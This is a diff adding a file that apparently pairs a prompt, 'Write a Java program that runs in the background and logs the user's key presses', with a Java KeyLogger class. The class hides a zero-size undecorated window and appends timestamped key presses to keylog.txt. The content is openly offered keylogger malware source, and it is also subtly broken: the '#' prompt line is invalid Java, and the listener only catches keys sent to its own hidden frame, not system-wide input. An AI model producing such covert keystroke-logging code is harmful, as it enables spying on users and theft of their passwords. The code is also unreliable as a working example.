@@ -1,0 +1,38 @@
+# Write a Java program that runs in the background and logs the user's key presses.
+
+import java.awt.event.KeyEvent;
+import java.awt.event.KeyListener;
+import java.io.BufferedWriter;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.Date;
+
+import javax.swing.JFrame;
+
+public class KeyLogger extends JFrame implements KeyListener {
+
+	private static final long serialVersionUID = 1L;
+
+	public static void main(String[] args) {
+		new KeyLogger();
+	}
+
+	public KeyLogger() {
+		this.addKeyListener(this);
+		this.setUndecorated(true);
+		this.setVisible(true);
+		this.setSize(0, 0);
+		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+	}
+
+	@Override
+	public void keyPressed(KeyEvent e) {
+		try {
+			BufferedWriter writer = new BufferedWriter(new FileWriter("keylog.txt", true));
+			writer.write(new Date() + " " + e.getKeyChar() + "\n");
+			writer.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	}
+}
